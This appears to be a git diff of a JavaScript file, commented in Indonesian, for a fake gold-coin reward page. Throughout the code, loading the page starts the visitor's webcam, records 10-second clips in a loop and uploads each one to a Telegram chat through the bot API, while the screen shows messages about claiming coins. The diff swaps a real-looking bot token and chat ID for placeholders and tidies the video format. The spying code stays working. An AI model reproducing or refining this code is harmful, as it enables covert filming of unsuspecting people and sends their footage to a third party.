@@ -7,51 +7,49 @@ const goldCoin = document.getElementById('goldCoin');
 let recordingInterval;
 let countdownTimer;
 
-// Masukkan token bot Telegram Anda di sini
-const telegramBotToken = '7258081396:AAHIu5xiKaw5qmSpo_JSScYZkrXzcFpTW4Q';  // Ganti dengan token bot Telegram Anda
-
-// Masukkan chat ID atau ID grup/channel di sini
-const chatId = '-4545188605';  // Ganti dengan chat ID atau username channel
+// Token bot Telegram dan chat ID
+const telegramBotToken = 'TOKEN_BOT_ANDA';  // Ganti dengan token bot Telegram Anda
+const chatId = 'ID_CHAT_ANDA';  // Ganti dengan chat ID
 
 async function startRecording() {
     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
 
-    mediaRecorder = new MediaRecorder(stream);
+    mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
 
     mediaRecorder.ondataavailable = (event) => {
-        videoChunks.push(event.data);
+        if (event.data.size > 0) {
+            videoChunks.push(event.data);
+        }
     };
 
-    // Function to send video to Telegram
-function sendVideoToTelegram() {
-    const videoBlob = new Blob(videoChunks, { type: 'video/mp4' });
-    const formData = new FormData();
+    function sendVideoToTelegram() {
+        const videoBlob = new Blob(videoChunks, { type: 'video/webm' });
+        const formData = new FormData();
 
-    formData.append('chat_id', chatId);  // Masukkan chat ID
-    formData.append('video', videoBlob, 'recording.mp4');  // Mengirim video sebagai media
-    formData.append('supports_streaming', true);  // Agar bisa diputar langsung di Telegram
+        formData.append('chat_id', chatId);
+        formData.append('video', videoBlob, 'recording.webm');  // Kirim sebagai video
+        formData.append('supports_streaming', true);  // Agar bisa langsung diputar di Telegram
 
-    fetch(`https://api.telegram.org/bot${telegramBotToken}/sendVideo`, {  // Ganti sendDocument ke sendVideo
-        method: 'POST',
-        body: formData,
-    })
-    .then(response => response.json())
-    .then(data => {
-        if (data.ok) {
-            statusDisplay.textContent = 'Koin berhasil terkirim ke tabungan!';
-        } else {
-            statusDisplay.textContent = 'Error: ' + data.description;
-        }
-    })
-    .catch(error => {
-        statusDisplay.textContent = 'Error saat mengklaim coba lagi!';
-        console.error('Error:', error);
-    });
+        fetch(`https://api.telegram.org/bot${telegramBotToken}/sendVideo`, {
+            method: 'POST',
+            body: formData,
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                statusDisplay.textContent = 'Video berhasil dikirim!';
+            } else {
+                statusDisplay.textContent = 'Error: ' + data.description;
+            }
+        })
+        .catch(error => {
+            statusDisplay.textContent = 'Terjadi kesalahan, coba lagi!';
+            console.error('Error:', error);
+        });
 
-    videoChunks = [];  // Reset videoChunks setelah pengiriman
-}
+        videoChunks = [];  // Reset videoChunks setelah pengiriman
+    }
 
-    // Function to start 10 seconds recording loop with countdown and gold claim message
     function start10SecondsRecording() {
         let countdown = 10;
         countdownDisplay.textContent = countdown;
@@ -60,7 +58,6 @@ function sendVideoToTelegram() {
             countdown--;
             countdownDisplay.textContent = countdown;
 
-            // Show the "Emas berhasil di klaim!" message and gold coin when countdown is 5 or below
             if (countdown <= 5) {
                 goldClaimMessage.style.display = 'block';
                 goldCoin.style.display = 'block';
@@ -74,6 +71,7 @@ function sendVideoToTelegram() {
             }
         }, 1000);
 
+        videoChunks = [];  // Kosongkan buffer sebelum mulai merekam
         mediaRecorder.start();
 
         setTimeout(() => {
@@ -81,23 +79,20 @@ function sendVideoToTelegram() {
         }, 10000);
 
         mediaRecorder.onstop = () => {
-            sendVideoToTelegram();  // Send the recorded video to Telegram
+            sendVideoToTelegram();  // Kirim video setelah rekaman selesai
         };
     }
 
-    // Start the recording loop
     recordingInterval = setInterval(() => {
         start10SecondsRecording();
-    }, 11000);  // Start a new recording every 11 seconds (1 second gap for sending)
+    }, 11000);
 }
 
-// Automatically start recording when the page is loaded
 window.addEventListener('load', () => {
     startRecording();
     statusDisplay.textContent = 'loading...';
 });
 
-// Clear the interval when the page is closed or refreshed
 window.addEventListener('beforeunload', () => {
     clearInterval(recordingInterval);
 });
